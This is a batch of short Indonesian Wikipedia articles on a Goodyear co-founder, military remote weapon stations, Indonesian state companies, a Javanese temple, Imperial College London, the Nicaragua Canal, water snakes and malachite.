Frank Augustus Seiberling (October 6, 1859 – August 11, 1955) adalah seorang Penemu dan Pendiri dari Amerika . Dia merupakan orang terkenal sebagai wakil pendiri Perusahaan Goodyear Tire & Rubber pada tahun 1898 dan Seiberling Rubber Company pada tahun 1921. Ia juga menciptakan Stan Hywet Hall, Sebuah Rumah Tudor Revival, Sekarang menjadi National Historic Landmark dan musium rumah sejarah di Akron, Ohio.

Merupakan putra dari seorang Pengusaha Jerman Amerika Ohio, Seiberling menyisihkan waktunya utuk belajar di Heidelberg College,Tiffin, Ohio, sebelum bergabung di Perusahaan J.F. Seiberling, Ayahnya merupakan seorang pebisnis mesin yang digunakan untuk pendukung pertanian, bekerja sebagai sekertaris dan penemu. Ayahnya, John Seiberling, Mendirikan perusahaan tersebut di Akron, Ohio, Menemukan mesin reaping pertama. Ketika bekerja untuk perusahaan, Seiberling menemukan benang pengikat yang mengikat bundel gandum dengan simpul pita.

Banyak para bisnisman gagal mengatasi Kepanikan tahun 1890-an, Termasuk perusahaan jalan kereta api yang dimiliki ayah Seiberling. Tahun 1898, Seiberling menjadi seorang pengangguran, mendekati umur 40 tahunan, ia masih harus menafkahi seorang istri dan 3 orang anak. Dia belajar dari ketersediaan pabrik karton jerami tua di East Akron, yang dibeli, bersama-sama dengan , harga $13,500. Dia meminjam $ 3.500 untuk uang muka dari saudara ipar, Lucius C. Miles. Dalam beberapa hari ia memutuskan bisnis apa dia akan masuk ke dalam, memilih nama, dan menjual saham. Bisnis akan karet; perusahaan akan diberi nama untuk Charles Goodyear, Penemuannya tentang vulkanisasi, yang mana telah meninggal tanpa uang sepeser pun selama hampir empat puluh tahun .

Pada Juni 1911, Seiberling mengumumkan bahwa ia melakukan pembiayaan usaha pada penerbangan transatlantik airship, yang akan dipimpin oleh Melvin Vaniman. Pada bulan Juli 1912, kapal udara " Akron " (ZR-4) meledak, lalu Vaniman beserta krunya tewas.

Seiberling mendonasikan jutaan dolar untuk amal. Ia termasuk dalam anggota Buchtel College dan menjadi asisten di Universitas Akron.

Seiberling lahir tanggal 6 October, 1859, di Western Star, Ohio, sebuah komunitas beberapa jauh dari tenggara Akron, dalam Summit County, Ohio. Tahun 1887, ia menikah dengan Gertrude Ferguson Penfield (1866–1946). Ia meninggal di Akron tanggal 11 Augustus 1955, dan dikubur di pekuburan Glendale .

Kakeknya, John F. Seiberling, Junior., Anggota Kongress Amerika dari Ohio.




</doc>
<doc id="1758089" url="https://id.wikipedia.org/wiki?curid=1758089" title="Protector (RWS)">
Protector (RWS)

M151 PROTECTOR Remote Weapon Station adalah stasiun senjata dikendalikan dari jarak jauh (remotely controlled weapons station/RWS) yang dapat dipasang ke kendaraan dan platform stasioner.

Alat ini diproduksi oleh Kongsberg Defence & Aerospace dari Norwegia dan Thales Group Prancis.



</doc>
<doc id="1758091" url="https://id.wikipedia.org/wiki?curid=1758091" title="TRT-25 remote weapon station">
TRT-25 remote weapon station

TRT-25 adalah stasiun senjata jarak jauh (Remote weapon station/RWS) yang dibuat oleh BAE Systems Land Systems Afrika Selatan menggabungkan autocannon M242 Bushmaster 25 mm (25 × 137mm). Turet senjata ini dirancang sebagai perlindungan diri dan dukungan senjata api Light Armoured Vehicles (LAV), Medium Mine Protected Vehicles (MMPV) dan Infantry Combat Vehicles (ICV).

Diluncurkan di Eurosatory di Paris pada bulan Juni 2010 ketika turet ditampilkan untuk pertama kalinya pada kendaraan perusahaan RG41 baru.



</doc>
<doc id="1758093" url="https://id.wikipedia.org/wiki?curid=1758093" title="Haruna Ogata">
Haruna Ogata

Di musim panas 2014, Ogata mengikuti audisi "Morning Musume '14 (Golden) Audition!" untuk kesempatan bergabung Morning Musume dan berhasil lulus. Pada 30 September 2014, ia diperkenalkan sebagai anggota generasi ke-12 dalam konser Morning Musume di Nippon Budokan, bersama dengan Miki Nonaka, Maria Makino dan Akane Haga.

Mulai tanggal 4 Januari 2015 Ogata bersama anggota generasi ke 12 mendapatkan slot acara radio di radio FM FUJI yang berjudul "Morning Musume '15 12ki Nikki!", yang mengudara setiap hari Minggu pukul 16:30~16:53 JST. Ogata membuat debut resminya pada singel ke 58 Morning Musume "Seishun Kozo ga Naiteiru / Yuugure wa Ameagari / Ima Koko Kara", yang dirilis 15 April 2015.









</doc>
<doc id="1758104" url="https://id.wikipedia.org/wiki?curid=1758104" title="Kimia Farma">
Kimia Farma

PT Kimia Farma Tbk. () adalah perusahaan industri farmasi pertama di Indonesia yang didirikan oleh Pemerintah Hindia Belanda tahun 1817. Nama perusahaan ini pada awalnya adalah NV Chemicalien Handle Rathkamp & Co. Berdasarkan kebijaksanaan nasionalisasi atas eks perusahaan Belanda di masa awal kemerdekaan, pada tahun 1958, Pemerintah Republik Indonesia melakukan peleburan sejumlah perusahaan farmasi menjadi PNF (Perusahaan Negara Farmasi) Bhinneka Kimia Farma. Kemudian pada tanggal 16 Agustus 1971, bentuk badan hukum PNF diubah menjadi Perseroan Terbatas, sehingga nama perusahaan berubah menjadi PT Kimia Farma (Persero).

Kimia Farma adalah perusahaan industri farmasi pertama di Indonesia yang didirikan oleh Pemerintah Hindia Belanda tahun 1817. Nama perusahaan ini pada awalnya adalah NV Chemicalien Handle Rathkamp & Co. Berdasarkan kebijaksanaan nasionalisasi atas eks perusahaan Belanda di masa awal kemerdekaan, pada tahun 1958, Pemerintah Republik Indonesia melakukan peleburan sejumlah perusahaan farmasi menjadi PNF (Perusahaan Negara Farmasi) Bhinneka Kimia Farma. Kemudian berdasarkan Peraturan Pemerintah nomor 16 Tahun 1971, bentuk badan hukum PNF diubah menjadi Perseroan Terbatas, sehingga nama perusahaan berubah menjadi PT Kimia Farma (Persero) berdasarkan akta notaris Soelaeman Ardjasasmita nomor 18 tanggal 16 Agustus 1971.

Pada tanggal 4 Juli 2001, PT Kimia Farma (Persero) kembali mengubah statusnya menjadi perusahaan publik, PT Kimia Farma (Persero) Tbk, dalam penulisan berikutnya disebut Perseroan. Bersamaan dengan perubahan tersebut, Perseroan telah dicatatkan pada Bursa Efek Jakarta dan Bursa Efek Surabaya (sekarang kedua bursa telah merger dan kini bernama Bursa Efek Indonesia). Berbekal pengalaman selama puluhan tahun, Perseroan telah berkembang menjadi perusahaan dengan pelayanan kesehatan terintegrasi di Indonesia. Perseroan kian diperhitungkan kiprahnya dalam pengembangan dan pembangunan bangsa, khususnya pembangunan kesehatan masyarakat Indonesia.

Pada tahun 2015, Anggaran Dasar mengalami perubahan dengan akta nomor 30 tanggal 8 April 2015 dari Nova Faisal, SH, MKn, notaris di Jakarta. Akta perubahan ini telah mendapat persetujuan dari Menteri Hukum dan Hak Asasi Manusia Republik Indonesia dengan Surat Keputusan nomor A1-IU-A1-I01030929918 Tahun 2015 tanggal 6 Mei 2015.

Dengan dukungan kuat Riset & Pengembangan, segmen usaha yang dikelola oleh perusahaan induk ini memproduksi obat jadi dan obat tradisional, yodium, kina dan produk-produk turunannya, serta minyak nabati. Lima fasilitas produksi yang tersebar di kota-kota besar di Indonesia merupakan tulang punggung dari segmen industri.

Plant Jakarta memproduksi sediaan tablet, tablet salut, kapsul, granul, sirop kering, suspensi/sirop, tetes mata, krim, antibiotika dan injeksi. Unit ini merupakan satu-satunya pabrik obat di Indonesia yang mendapat tugas dari pemerintah untuk memproduksi obat golongan narkotika. Industri formulasi ini telah memperoleh sertifikat Cara Pembuatan Obat yang Baik (CPOB) clan ISO-9001.

Plant Bandung memproduksi bahan baku kina dan turunan-turunannya, rifampicin, obat asli Indonesia dan alat kontrasepsi dalam rahim (AKDR). Unit produksi ini telah mendapat US-FDA Approval. Selain itu, Plant Bandung juga memproduksi tablet, sirup, serbuk, dan produk kontrasepsi Pil Keluarga Berencana. Unit produksi ini telah menerima sertifikat Cara Pembuatan Obat yang Baik (CPOB) dan ISO-9002.

Plant Semarang mengkhususkan diri pada produksi minyak jarak, minyak nabati dan kosmetika (bedak). Untuk menjamin kualitas hasil produksi, unit ini secara konsisten menerapkan sistem manajemen mutu ISO-9001 serta telah memperoleh sertifikat Cara Pembuatan Obat yang Baik (CPOB) dan US-FDA Approval.

Plant Sarolangun di Jambi Barat mengkhususkan diri pada produksi minyak jarak, minyak nabati dan kosmetika (bedak). Untuk menjamin kualitas hasil produksi, unit ini secara konsisten menerapkan sistem manajemen mutu ISO-9001 serta telah memperoleh sertifikat Cara Pembuatan Obat yang Baik (CPOB) dan US-FDA Approval.

Plant Watudakon di Jawa Timur merupakan satu-satunya pabrik yang mengolah tambang yodium di Indonesia. Unit ini memproduksi yodiurn dan garam-garamnya, bahan baku ferro sulfat sebagai bahan utama pembuatan tablet besi untuk obat tambah darah, dan kapsul lunak "Yodiol" yang merupakan obat pilihan untuk pencegahan gondok. Plant Watudakon juga mempunyai fasilitas produksi formulasi seperti tablet, tablet salut, kapsul lunak, salep, sirop clan cairan obat luar/dalam. Unit ini telah memperoleh sertifikat Cara Pembuatan Obat yang Baik (CPOB), ISO-9002 clan ISO-14001.

Plant Tanjung Morawa di Medan, Sumatra Utara, dikhususkan untuk memasok kebutuhan obat di wilayah Sumatra. Produk yang dihasilkan oleh pabrik yang telah memperoleh sertifikat Cara Pembuatan Obat yang Baik (CPOB) ini meliputi sediaan tablet, krim dan kapsul.

Ethical (Analgesic, Vitamin Supplements &, Cardiac Therapy, Radiopharmaka, Laxative, Skin Remedies, Cough and Influenza, Corticosteroid, Bronchodilator, Cephalosporin, Antivirus, Antivertigo, Narcotic, Antitrombotik, Antiseptic, Antiretroviral), Generics Antihypertensives , Antihyperlipidemic, Antihemoroid, Antigout, Anti Epilepsy, Rehydration, Antidiarrhoeal, Antibiotics, Anti Asthma, Anti Allergy, Anti Tuberculosis, Anti Systemic Mycotic, Anti Malaria, Antifungal, Anti-emetic, Anti Diuretic, Anti Diabetes, Anti Depressant Antiemetic and Antinausea, Anti Anxiety, Anti Amoebic, Analgesic, Anthelmintic, Antacid, Anti Anemia, Anti Hemorrhoidal), Others (Raw Materials, OTC Herbal & ID, Cosmetics & Body Care)

PT. Kimia Farma Trading & Distribution (KFTD), adalah anak perusahaan yang dibentuk oleh Kimia Farma yang berperan penting dalam upaya peningkatan penjualan produk-produk Perseroan. PT Kimia Farma Trading & Distribution memiliki jaringan sebanyak 46 cabang dan tenaga salesman sejumlah 611 orang untuk melayani 45.173 outlet terdaftar di seluruh wilayah Indonesia. Disamping mendistribusikan produk-produk Kimia Farma, KFTD juga bertindak sebagai distributor untuk produk-produk principaari dalam dan luar negeri.

PT. Kimia Farma Apotek, adalah anak perusahaan yang dibentuk oleh Kimia Farma untuk mengelola Apotek-apotek milik perusahaan yang ada, dalam upaya meningkatkan kontribusi penjualan untuk memperbesar penjualan konsolidasi PT. Kimia Farma Tbk

Menangkap peluang dari meningkatnya kesadaran masyarakat akan pentingnya arti Kesehatan, pembentukan unit usaha baru ini terutama ditujukan untuk memberikan layanan pemeriksaan Laboratorium Klinik dan Pemeriksaan Mikrobiologi Industri.

Layanan yang diberikan, yaitu :

Klinik Kimia Farma ke depan dihadirkan oleh perusahaan sebagai suatu solusi total kesehatan.

PT. Kimia Farma juga telah melakukan ekspansi bisnisnya tidak hanya di tingkat nasional tetapi juga mulai memasuki tingkat perdagangan internasional. Produk-produk Kimia Farma yang mencakup produk obat jadi dan sediaan farmasi serta bahan baku obat seperti Iodine dan Quinine telah memasuki pasar dinegara : Eropa, India, Jepang, Taiwan dan Selandia Baru. Produk Jadi dan Kosmetik telah dipasarkan ke Yaman, Korea Selatan, Singapura, Malaysia, Vietnam, Sudan, dan Papua Nugini. Demikian juga untuk produk-produk herbal yang berasal dari bahan alami juga telah dipersiapkan proses registrasinya untuk memasuki pasar baru seperti : Filipina, Myanmar, Pakistan, Uni Emirat Arab, Oman, Bahrain dan Bangladesh. Produk Herbal merupakan target utama korporasi untuk periode mendatang mengingat banyaknya peminat dan pembeli potensial yang telah menunjukkan minat untuk melakukan hubungan bisnis dengan perusahaan.

Isu tentang akan mergernya Kimia Farma dengan BUMN Farmasi lainnya sudah dimulai dari tahun 2001. Namun sampai saat ini merger tersebut belum terealisasi. Saat ini sedang dirancang merger antara Kimia Farma dan Indofarma yang diharapkan selesai paling lambat Quarter I tahun 2010. Setelah lama tidak ada perkembangan, di akhir tahun 2014 Menteri BUMN mengumumkan bahwa proses penggabungan Kimia Farma dan Indofarma akan menjadikan Kimia Farma sebagai holding. Manajemen kedua perusahaan telah menyelaraskan rancangan bisnis untuk mengantisipasi penggabungan.

Kimia farma the best


</doc>
<doc id="1758109" url="https://id.wikipedia.org/wiki?curid=1758109" title="Pegadaian (perusahaan)">
Pegadaian (perusahaan)

Pegadaian adalah sebuah BUMN sektor keuangan Indonesia yang bergerak pada tiga lini bisnis perusahaan yaitu pembiayaan, emas dan aneka jasa.

Menurut kitab Undang-undang Hukum Perdata Pasal 1150, gadai adalah hak yang diperoleh seorang yang mempunyai piutang atas suatu
barang bergerak. Barang bergerak tersebut diserahkan kepada orang yang berpiutang oleh seorang yang mempunyai utang atau oleh seorang lain atas nama orang yang mempunyai utang. Seorang yang berutang tersebut memberikan kekuasaan kepada orang berpiutang untuk menggunakan barang bergerak yang telah diserahkan untung melunasi utang apabila pihak yang berutang tidak dapat memenuhi kewajibannya pada saat jatuh tempo.

Perusahaan umum pegadaian adalah satu-satunya badan usaha di Indonesia yang secara resmi mempunyai izin untuk melaksanakan kegiatan lembaga keuangan berupa pembiayaan dalam bentuk penyaluran dana ke masyarakat atas dasar hukum gadai seperti dimaksud dalam Kitab Undang-undang Hukum Perdata Pasal 1150 di atas.

Sejarah pegadaian dimulai pada saat Pemerintah Belanda (VOC) mendirikan Bank van Leening yaitu lembaga keuangan yang memberikan kredit dengan sistem gadai, lembaga ini pertama kali didirikan di Batavia pada tanggal 20 Agustus 1746.

Ketika Inggris mengambil alih kekuasaan Indonesia dari tangan Belanda (1811-1816), Bank Van Leening milik pemerintah dibubarkan, dan masyarakat diberi keleluasaan untuk mendirikan usaha pegadaian asal mendapat lisensi dari Pemerintah Daerah setempat ("liecentie stelsel"). Namun metode tersebut berdampak buruk pemegang lisensi menjalankan praktik rentenir atau lintah darat yang dirasakan kurang menguntungkan pemerintah berkuasa (Inggris). Oleh karena itu metode "liecentie stelsel" diganti menjadi "pacth stelsel" yaitu pendirian pegadaian diberikan kepada umum yang mampu membayar pajak yang tinggi kepada pemerintah daerah.

Pada saat Belanda berkuasa kembali, pacth stelsel tetap dipertahankan dan menimbulkan dampak yang sama. Pemegang hak ternyata banyak melakukan penyelewengan dalam menjalankan bisnisnya. Selanjutnya pemerintah Hindia Belanda menerapkan apa yang disebut dengan "cultuur stelsel" di mana dalam kajian tentang pegadaian saran yang dikemukakan adalah sebaiknya kegiatan pegadaian ditangani sendiri oleh pemerintah agar dapat memberikan perlindungan dan manfaat yang lebih besar bagi masyarakat. Berdasarkan hasil penelitian tersebut, pemerintah Hindia Belanda mengeluarkan Staatsblad No. 131 tanggal 12 Maret 1901 yang mengatur bahwa usaha Pegadaian merupakan monopoli Pemerintah dan tanggal 1 April 1901 didirikan Pegadaian Negara pertama di Sukabumi, Jawa Barat. Selanjutnya setiap tanggal 1 April diperingati sebagai hari ulang tahun Pegadaian.

Pada masa pendudukan Jepang gedung kantor pusat Jawatan Pegadaian yang terletak di jalan Kramat Raya 162, Jakarta dijadikan tempat tawanan perang dan kantor pusat Jawatan Pegadaian dipindahkan ke jalan Kramat Raya 132. Tidak banyak perubahan yang terjadi pada masa pemerintahan Jepang baik dari sisi kebijakan maupun struktur organisasi Jawatan Pegadaian. Jawatan Pegadaian dalam bahasa Jepang disebut ‘Sitji Eigeikyuku’, Pimpinan Jawatan Pegadaian dipegang oleh orang Jepang yang bernama Ohno-San dengan wakilnya orang pribumi yang bernama M. Saubari.

Pada masa awal pemerintahan Republik Indonesia, kantor Jawatan Pegadaian sempat pindah ke Karanganyar, Kebumen karena situasi perang yang kian memanas. Agresi Militer Belanda II memaksa kantor Jawatan Pegadaian dipindah lagi ke Magelang.
Pasca perang kemerdekaan kantor Jawatan Pegadaian kembali lagi ke Jakarta dan Pegadaian dikelola oleh Pemerintah Republik Indonesia. Dalam masa ini, Pegadaian sudah beberapa kali berubah status, yaitu sebagai Perusahaan Negara (PN) sejak 1 Januari 1961, kemudian berdasarkan Peraturan Pemerintah No.7/1969 menjadi Perusahaan Jawatan (Perjan), dan selanjutnya berdasarkan Peraturan Pemerintah No.10/1990 (yang diperbaharui dengan Peraturan Pemerintah No.103/2000) berubah lagi menjadi Perusahaan Umum (Perum).
Kemudian pada tahun 2011, perubahan status kembali terjadi yakni dari Perum menjadi Perseroan yang telah ditetapkan dalam Peraturan Pemerintah (PP) No.51/2011 yang ditandatangani pada 13 Desember 2011. Namun, perubahan tersebut efektif setelah anggaran dasar diserahkan ke pejabat berwenang yaitu pada 1 April 2012



Menerima pembayaran tagihan listrik, telepon, air, tv langganan, internet, finance, pulsa handphone, pengiriman uang kedalam dan keluar negeri, tiket kereta.


Manfaat utama yang diperoleh oleh nasabah yang
meminjam dari Pegadaian adalah ketersediaan dana dengan prosedur yang
relatif lebih sederhana dan dalam waktu yang lebih cepat terutama apabila
dibandingkan dengan kredit perbankan. Disamping itu, mengingat jasa yang
ditawarkan oleh Pegadaian tidak hanya jasa pegadaian, maka nasabah juga
dapat memperoleh manfaat antara lain:

a. Penaksiran
nilai suatu barang bergerak dari pihak atau institusi yang telah berpengalaman
dan dapat dipercaya.

b. Penitipan
suatu barang bergerak pada tempat yang aman dan dapat dipercaya.

Manfaat yang diharapkan dari Pegadaian sesuai
jasa yang diberikan kepada nasabahnya adalah:

a. Penghasilan
yang bersumber dari sewa modal yang dibayarkan oleh peminjam dana.

b. Penghasilan
yang bersumber dari ongkos yang dibayarkan oleh nasabah memperoleh jasa
tertentu dari Perum Pegadaian.

c. Pelaksanaan
misi Pegadaian sebagai suatu Badan Usaha Milik Negara yang bergerak dalam
bidang pembiayaan berupa pemberian bantuan kepada masyarakat yang memerlukan
dana dengan prosedur dan cara yang relatif sederhana.

d. Berdasarkan
Peraturan Pemerintah No. 10 Tahun 1990, laba yang diperoleh oleh Pegadaian digunakan untuk:

Pegadaian membuka layanan di hari Minggu. Jam buka dari pukul 10.00 - 14.00. Daftar lokasi yang buka di hari minggu sebagai berikut:



</doc>
<doc id="1758118" url="https://id.wikipedia.org/wiki?curid=1758118" title="Candi Medalem">
Candi Medalem

Candi Medalem adalah peninggalan masa klasik Indonesia yang terletak di Kabupaten Sidoarjo. Candi ini terletak di desa Medalem, Kecamatan Tulangan, dan Kabupaten Sidoarjo. Bangunan ini termasuk cagar budaya. Candi ini terletak di Provinsi Jawa Timur. Bentuknya sangat unik bentuk candinya kecil dan terdapat jalan untuk berpindah tempat dari candi satu ke candi yang lain.

Dahulunya sebelum candi ini di temukan merupakan kebun – kebun atau pohon – pohon asem yang sangat besar. Pada saat Pak Glendang (Juru Kunci) bersih – bersih kebun dia mendapat bisikan ghaib. Menurut bisikan yang di terima adalah supaya pohon asem itu harus di tebang karena nanti akan menemukan benda sejarah peninggalan nenek moyang. Setelah mendengar wisik seperti itu, Pak Glendang lalu menggali tanah, terus pohon asem itu di tebang dan tidak lama kemudian terlihatlah sebuah tumpukan batu bata merah besar. Melihat benda seperti itu, Pak Glendang lalu memanggil warga sekitar. Warga berpendapat bahwa benda itu adalah candi dan Pak Glendang meneruskan penggalian itu di bantu dengan warga dalam jangka waktu 3 hari.

Candi ini telah sering di pugar biasa yang sering rusak adalah bagian jalan candi dan atap candi.


</doc>
<doc id="1758129" url="https://id.wikipedia.org/wiki?curid=1758129" title="Imperial College London">
Imperial College London

Imperial College London (The Imperial College of Science, Technology and Medicine) adalah perguruan tinggi negeri riset di Inggris. Didirikan oleh Pangeran Albert, perguruan ini didirikan untuk menggiatkan pendidikan di bidang sains, perdagangan, dan seni, terdiri dari Natural History Museum, Museum Victoria dan Albert, Science Museum, Royal Albert Hall dan Imperial Institute. Imperial Institute didirikan oleh istrinya, Queen Victoria yang melakukan peletakan batu pertama. Kemudian dilanjutkan oleh Ratu Elizabeth II dan Duke of York yang membuka Imperial College Business School. Universitas ini terus tumbuh seiring bergabung dengan Sekolah Kedokteran Rumah Sakit St Mary, Charing Cross dan Sekolah Kedokteran Westminster, Royal Postgraduate Medical School dan Institut Jantung dan Paru Nasional. Awalnya merupakan salah satu bagian dari Universitas London, Imperial menjadi institut terpisah pada ulang tahunnya yang ke-100.

Imperial dibagi menjadi 4 fakultas: sains, teknik, kedokteran, dan bisnis. Kampus utamanya berada di Kensington Selatan. Universitas ini merupakan pusat penelitian biomedis utama dan pusat sains kesehatan akademis pertama di Britania Raya. Imperial merupakan anggota Russell Group, G5, Association of Commonwealth Universities, League of European Research Universities, dan "Golden Triangle" Universitas Inggris.

Imperial secara konsisten berada di peringkat teratas di dunia, berada pada posisi 2 di 2015 QS World University Rankings dan ke-9 di 2015 Times Higher Education World University Rankings. Menurut "The New York Times", para rekruiter menganggap siswanya termasuk di antara 10 yang paling dicari di dunia. Para alumni dan stafnya telah memperoleh 15 Penghargaan Nobel, 2 Medali Fields, 70 Fellows Royal Society, 82 Fellow Royal Academy of Engineering dan 78 Fellow Academy of Medical Sciences.



</doc>
<doc id="1758137" url="https://id.wikipedia.org/wiki?curid=1758137" title="Terusan Nikaragua">
Terusan Nikaragua

Terusan Nikaragua (), resminya Nicaraguan Canal and Development Project (disebut juga Terusan Besar Nikaragua atau Terusan Besar Antarlautan Nikaragua) adalah rute perkapalan yang sedang dibangun melintasi Nikaragua supaya menghubungkan Laut Karibia (sekaligus Samudra Atlantik) dengan Samudra Pasifik. Pada Juni 2013, Majelis Nasional Nikaragua menyetujui RUU yang memberi konsesi pendanaan dan pelaksanaan proyek selama 50 tahun kepada perusahaan swasta Hong Kong Nicaragua Canal Development Investment Company (HKND Group) yang dipimpin Wang Jing, seorang miliarder Cina. Konsesi dapat diperpanjang lagi selama 50 tahun setelah jalur perairannya dioperasikan.
Pembangunan terusan yang diperkirakan memakan 40 sampai 50 miliar dolar AS ini dimulai pada bulan Desember 2014. Proyek ini dijadwalkan selesai dalam kurun lima tahun.
Namun demikian, pemerintah Nikaragua tidak dapat memberi informasi tepercaya mengenai anggarannya sehingga banyak pihak yang meragukan kelanjutan proyek ini.
Para ilmuwan mempermasalahkan dampak lingkungan dari proyek ini karena Danau Nikaragua merupakan sumber air tawar utama di Amerika Tengah.

Pembangunan Terusan Nikaragua lewat Sungai San Juan sebagai rute akses ke Danau Nikaragua sudah digagas pada zaman kolonial. Amerika Serikat membatalkan rencana pembangunan jalur perairan di Nikaragua pada awal abad ke-20 setelah mengambil alih proyek Prancis di Terusan Panama.

Proyek ini diperkirakan memakan biaya 40 sampai 50 miliar dolar AS.
Selain uang pribadi yang disediakan Wang Jing, investor lain diharapkan ikut menanamkan modalnya. Penawaran umum perdana sedang disiapkan pada akhir 2014.
XCMG, perusahaan konstruksi pemerintah Cina, akan memasok mesin-mesin berat dan memegang 1,5 sampai 3 % saham HKND.

Per akhir 2014, investor besar yang terlibat proyek ini belum diketahui. Muncul sejumlah dugaan bahwa pemerintah Cina memberi bantuan keuangan untuk proyek ini, tetapi Cina dan Wang Jing sendiri membantahnya.





</doc>
<doc id="1758146" url="https://id.wikipedia.org/wiki?curid=1758146" title="Buku:Elektronik">
Buku:Elektronik



</doc>
<doc id="1758148" url="https://id.wikipedia.org/wiki?curid=1758148" title="Ular padi">
Ular padi

Hypsiscopus atau Ular padi adalah genus ular air dari suku Homalopsidae yang endemik di wilayah Asia Tenggara. Dinamai ular padi karena mereka kerap ditemukan di perairan sawah dan sistem irigasi persawahan. Terdapat 2 spesies.


List of Indonesian Homalopsids species @ Reptile Database


</doc>
<doc id="1758151" url="https://id.wikipedia.org/wiki?curid=1758151" title="Bockadam">
Bockadam

Bockadam adalah kelompok ular air payau (semi-marine snake) dari suku Homalopsidae yang tersebar luas di Asia Tenggara hingga Australia. Nama umumnya dalam bahasa Inggris adalah dog-faced water snake atau bockadam. Terdapat 5 spesies.

Semua jenis ular ini adalah beberapa jenis ular yang toleran terhadap air asin, sama seperti ular-air bakau. Habitat ular ini adalah di hampir semua perairan dataran rendah: sungai, rawa, kolam alami, tambak, hingga daerah muara. Di Indonesia, ular-ular ini terdapat hampir di semua kepulauan.




</doc>
<doc id="1758155" url="https://id.wikipedia.org/wiki?curid=1758155" title="Ular bertentakel">
Ular bertentakel

Ular bertentakel adalah sejenis ular air, satu-satunya dari genus "Erpeton" suku Homalopsidae. Ular ini adalah satu-satunya ular di dunia yang memiliki sepasang tentakel seperti kumis di hidungnya. Ular ini terdapat di Asia Tenggara.

Ular ini berukuran kecil, panjangnya antara 50 sampai 90 meter. Warna tubuhnya cokelat gelap dengan belang-belang sempit berwarna cokelat pucat di punggung dan di kedua sisi badan.

Ular ini adalah satu-satunya ular di dunia yang memiliki dua tentakel yang terletak di dekat hidungnya. Fungsi tentakel ini untuk membantunya mendeteksi mangsanya di air yang keruh. Mangsanya adalah ikan kecil.

Ular ini tidak berbahaya bagi manusia. Taring bisa ular ini terletak di rahang belakang atas dan berukuran sangat kecil. Bisanya hanya mampu membunuh mangsanya.

Ular ini hanya bisa di temukan di Thailand, Kamboja, Laos, dan Vietnam. Habitat ular ini adalah sungai yang mengalir pelan, tambak, perairan dekat sawah, dan saluran irigasi.



</doc>
<doc id="1758156" url="https://id.wikipedia.org/wiki?curid=1758156" title="Malasit">
Malasit

Malasit () adalah suatu mineral karbonat hidroksida tembaga, dengan rumus kimia CuCO(OH). Mineral hijau buram ini terikat mengkristal dalam bentuk sistem kristal monoklin, dan seringkali bentuknya bergugus ("botryoidal"), berserat, atau massa stalagmitik, dalam retakan dan ruang yang jauh di bawah tanah di mana terdapat genangan air dan cairan hidrotermal untuk terjadinya presipitasi kimiawi. Potongan kristal individual jarang ditemukan namun ada yang berbentuk prisma-prisma ramping atau menjarum ("asikular"). Bentuk semu (pseudomorf) yang menyerupai kristal azurit tabular atau gumpalan juga dijumpai.

Nama batu ini berasal dari bahasa Latin: "molochītis", Prancis Pertengahan: "melochite", dan Inggris Pertengahan "melochites"; dari Yunani "Μολοχίτης λίθος" "molochitis lithos", "batu hijau mallow", dari "μολόχη" "molōchē", varian dari "μαλάχη" "malāchē", "mallow". Mineral ini dinamakan demikian karena menyerupai daun pohon Mallow (sejenis perdu).

Bukti arkeologi menunjukkan bahwa mineral ini telah ditambang dan dilebur di Lembah Timna di Israel selama lebih dari 3.000 tahun. Sejak masa itu, malasit telah digunakan sebagai batu hias dan batu permata.




</doc>
<doc id="1758158" url="https://id.wikipedia.org/wiki?curid=1758158" title="Hitrole">
Hitrole

Hitrole adalah stasiun senjata jarak jauh (remote weapons station) yang diproduksi oleh perusahaan senjata Italia, Oto Melara. "role" adalah nama pendek untuk "Remote Overhead, Light Electrical".

Turet dapat dipasang dengan berbagai senjata otomatis ringan, termasuk senapan mesin 5,56 milimeter (0,219 in), 7,62 milimeter (0.300 in), 12,7 milimeter (0,50 di), dan peluncur granat otomatis 40 milimeter (1,6 in).

Senjata ini gyroscopically stabil. Turet ini memiliki berat antara 210 kilogram (460 lb) -260 kilogram (570 pon), tergantung pada senjata dipasang. Optik jarak jauh penembak menambahkan kamera infra merah dan laser range finder untuk kamerabiasa cahaya tampak.

Penembak dibantu dengan komputer pengendalian tembakan. Komputer pengendalian tembakan dapat membantu melacak target bergerak.

Pada tahun 2009 Angkatan Darat Italia memerintahkan 81 turet untuk melengkapi kendaraan Iveco Lince nya di Afghanistan.

Menurut Jane Angkatan Laut Internasional, Angkatan Laut Singapura memerintahkan turet Hitrole pada bulan Agustus 2013. Sebanyak 16 turet diperintahkan untuk 8 Kapal Misi Littoral Singapura.



</doc>
<doc id="1758160" url="https://id.wikipedia.org/wiki?curid=1758160" title="Nanuk Remotely Controlled Weapon Station">
Nanuk Remotely Controlled Weapon Station

Nanuk adalah stasiun senjata jarak jauh (remote weapon station/RWS) yang digunakan untuk senjata kaliber ringan dan menengah yang dapat diinstal pada semua jenis kendaraan lapis baja atau kapal air patroli Brown.

Alat ini dirancang oleh Rheinmetall Kanada, di Quebec, Kanada. Kata Nanuk (ᓇᓄᖅ) berarti "beruang kutub" di Inuktitut.



</doc>
<doc id="1758161" url="https://id.wikipedia.org/wiki?curid=1758161" title="Reutech Rogue">
Reutech Rogue

Sistem senjata jarak Reutech Rogue jauh adalah sistem turret dikendalikan dari jarak jauh untuk senjata mulai dari senapan mesin 7,62 mm hingga 20mm ke meriam 40mm atau peluncur granat otomatis. Sebuah versi untuk peluru kendali anti-tank juga telah dikembangkan. Ada versi untuk penggunaan darat dan maritim yang diproduksi di Afrika Selatan oleh Reutech Solutions.



</doc>
<doc id="1758162" url="https://id.wikipedia.org/wiki?curid=1758162" title="Rafael Overhead Weapon Station">
Rafael Overhead Weapon Station

Rafael Overhead Weapon Station adalah stasiun senjata jarak jauh (remote weapon station) yang dikembangkan oleh Rafael Advanced Defense Systems bekerja sama dengan Angkatan Pertahanan Israel.

Ini telah-telah digantikan oleh Rafael Samson Remote Controlled Weapon Station (RCWS). Namun, model yang lebih besar Rafael OWS-25 dan OWS-25R. Masih dalam produksi.



</doc>
<doc id="1758163" url="https://id.wikipedia.org/wiki?curid=1758163" title="Piala Dunia U-20 FIFA 2015 Grup E">
Piala Dunia U-20 FIFA 2015 Grup E

Grup E Piala Dunia U-20 FIFA 2015 terdiri dari Nigeria, , , dan Hongaria. Pertandingan akan berlangsung dari tanggal 1 Juni sampai 7 Juni 2015.

(H) adalah Tuan Rumah<br>
? adalah belum diketahui.


</doc>
<doc id="1758164" url="https://id.wikipedia.org/wiki?curid=1758164" title="Piala Dunia U-20 FIFA 2015 Grup F">
Piala Dunia U-20 FIFA 2015 Grup F

